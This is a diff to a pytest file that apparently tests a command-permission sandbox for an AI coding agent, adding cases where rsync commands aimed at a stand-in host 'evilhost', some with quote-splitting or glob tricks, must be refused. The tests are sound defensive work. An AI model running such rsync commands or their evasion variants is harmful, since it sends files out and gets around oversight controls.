@@ -101,7 +101,6 @@ def test_the_followed_cd_admits_its_relative_write(tmp_path: Path) -> None:
         (f"sort --output={CWD}/src/a.py {WT}/b.txt", jail.R_BASH_OUTSIDE.format(f"{CWD}/src/a.py")),
         (f"uniq {WT}/a.txt {CWD}/src/a.py", jail.R_BASH_OUTSIDE.format(f"{CWD}/src/a.py")),
         (f"find {WT} -fprint {WT}/out.txt", shell.R_FIND_WRITE),
-        (f"rsync {WT}/a.txt evilhost:x", shell.R_RSYNC_REMOTE),
         (f"cd {WT} && python3 ../x.py", shell.R_INLINE),
     ],
 )
@@ -109,6 +108,29 @@ def test_a_typed_write_or_program_off_its_bounds_is_refused(command: str, consta
     # 228 S3b, SA-6: a write named by an option or an operand slot is judged by its typed path.
     d = decide(_b("coder", command), CFG)
     assert not d.allow and d.reason == constant, (command, d.reason)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        f"rsync {WT}/a.txt evilhost:x",
+        f"rsync {WT}/a.txt rsync://host/x",
+        f"rsync {WT}/a.txt 'evil''host':x",
+        f"rsync evilhost:x {WT}/b.txt",
+        f"rsync h*:x {WT}/b.txt",
+        f"rsync -a -- evilhost:x {WT}/b.txt",
+    ],
+)
+def test_an_rsync_host_operand_is_refused_at_admission(command: str) -> None:
+    # 228 S3c, SS-4: a colon before the first slash, or a glob before it, names a host.
+    d = decide(_b("coder", command), CFG)
+    assert not d.allow and str(d.reason).startswith(shell.R_RSYNC_REMOTE), (command, d.reason)
+    assert "as a remote host:path operand" in str(d.reason), d.reason
+
+
+def test_an_rsync_colon_after_a_slash_is_a_local_path() -> None:
+    # 228 S3c, AC-2: one token from the row above; ./h:x is a local file name.
+    assert decide(_b("coder", f"rsync {WT}/a.txt {WT}/h:x"), CFG).allow
 
 
 def test_a_data_dir_stage_the_grammar_admits_meets_the_tripwire() -> None:
